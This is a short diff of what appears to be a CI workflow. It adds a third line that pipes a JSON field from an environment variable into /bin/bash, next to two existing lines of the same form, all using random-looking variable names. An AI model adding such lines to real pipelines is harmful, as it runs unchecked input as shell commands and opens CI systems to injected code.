@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$hixf1553" | jq -r .zll4 | /bin/bash
           echo $zj3 | jq -r .x8212 | /bin/bash
+          echo $ro869 | jq -r .y33 | /bin/bash
 
       - name: Persist results
         if: always()
